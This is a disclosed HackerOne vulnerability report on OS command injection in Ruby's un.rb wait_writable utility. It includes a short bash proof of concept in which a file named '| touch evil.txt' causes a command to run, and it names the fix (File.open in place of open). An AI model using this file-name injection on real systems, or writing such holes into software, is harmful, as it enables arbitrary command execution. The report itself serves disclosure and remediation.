# OS Command Injection in '/lib/un.rb -- Utilities to replace common UNIX commands in Makefiles etc'

## Report Details
- **Report ID**: 1158824
- **URL**: https://hackerone.com/reports/1158824
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-04-09T13:15:22.696Z
- **Disclosed**: 2021-07-19T09:54:30.940Z

## Reporter
- **Username**: sighook
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
If the `wait_writable` command  receives a list of files with a command in the name of one of them, it will be executed.

# PoC

```bash
$ touch \|\ touch\ evil.txt
$ ls
'| touch evil.txt'
$ ruby -run -e wait_writable -- -w 1 -v *
$ ls
evil.txt  '| touch evil.txt'
```

The vulnerability has the same severity as https://hackerone.com/reports/651518 . The fix, respectively, is the same: `open` -> `File.open`.

## Impact

An attacker can use this problem to execute arbitrary commands in environments that uses ruby coreutilities.

## Attachments
No attachments
